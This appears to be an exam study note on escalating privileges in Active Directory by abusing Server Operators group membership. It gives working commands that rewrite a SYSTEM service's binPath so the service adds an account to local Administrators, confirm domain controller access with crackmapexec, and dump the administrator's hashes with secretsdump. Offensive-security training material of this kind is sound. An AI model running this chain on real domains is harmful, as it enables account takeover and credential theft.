# **Server Operators – Service Abuse for Privilege Escalation**

## **Key Concepts**

- **Server Operators**: Highly privileged AD group that can administer Windows servers without Domain Admin privileges.
- Members can log in locally to servers, including **Domain Controllers**.
- Membership grants powerful privileges:
  - `SeBackupPrivilege`
  - `SeRestorePrivilege`
  - Ability to control local services.

## **Service Enumeration**

### **Check Service Configuration**

Use `sc.exe` to inspect a service's configuration and identify the account it runs under.

```
sc qc AppReadiness
```

Important field:

\- `SERVICE_START_NAME: LocalSystem` → Service runs as **SYSTEM**.

### **Check Service Permissions**

Use Sysinternals `PsService.exe` to enumerate service permissions.

```
PsService.exe security AppReadiness
```

Look for:

- `BUILTIN\Server Operators`
- `All` → `SERVICE_ALL_ACCESS` (full service control)

**Exam takeaway:** If Server Operators have full control over a service running as SYSTEM, the service can potentially be abused for privilege escalation.

## **Exploitation – Modify Service Binary Path**

### **1. Check Local Administrators**

```
net localgroup Administrators
```

Confirm your current account is not already a local administrator.

### **2. Modify Service Binary Path**

Change the service's executable path to execute a command that adds your account to the local Administrators group.

```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

**Syntax note:** Space after `binPath=` is required.

### **3. Start the Service**

```
sc start AppReadiness
```

The service may fail with error `1053` because the modified command is not a valid service executable. However, the command may still execute before the failure.

### **4. Verify Privilege Escalation**

```
net localgroup Administrators
```

Confirm that your account was added to the Administrators group.

## **Confirm Access to Domain Controller**

```
crackmapexec smb <DC_IP> -u server_adm -p '<PASSWORD>'
```

\- `(Pwn3d!)` → Indicates successful administrative access.

## **Credential Extraction from Domain Controller**

Dump domain credentials using Impacket:

```
secretsdump.py server_adm@<DC_IP> -just-dc-user administrator
```

- `-just-dc-user administrator` → Extracts credentials for the specified domain account.
- `DRSUAPI` → Method used to retrieve secrets from the domain controller's directory database.
- Output may include:
  - NTLM hash
  - Kerberos AES keys
  - Other credential material

## **Exam Cheat Sheet**

| Finding                           | Significance                            |
| --------------------------------- | --------------------------------------- |
| Server Operators membership       | Highly privileged group                 |
| `SERVICE_START_NAME: LocalSystem` | Service runs as SYSTEM                  |
| `SERVICE_ALL_ACCESS`              | Full control over service               |
| Writable `binPath`                | Potential command execution via service |
| `sc start` error 1053             | Command may still have executed         |
| Added to local Administrators     | Privilege escalation successful         |
| `(Pwn3d!)`                        | SMB administrative access confirmed     |
| `secretsdump.py`                  | Credential extraction from DC           |

**Attack chain:**

`Server Operators → Service permissions → Modify binPath → Execute command → Local Administrators → Domain Controller access → Credential extraction`
